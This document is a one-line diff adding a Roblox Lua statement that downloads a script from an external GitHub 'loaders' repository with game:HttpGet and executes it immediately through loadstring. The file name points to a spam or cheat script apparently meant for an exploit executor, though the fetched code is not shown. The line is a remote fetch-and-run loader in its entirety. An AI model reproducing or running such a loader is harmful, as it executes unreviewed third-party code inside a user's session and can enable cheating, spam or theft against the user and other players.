@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/beta-buddytime-spam6-8xuz2vgphbxpwf.lua"))()
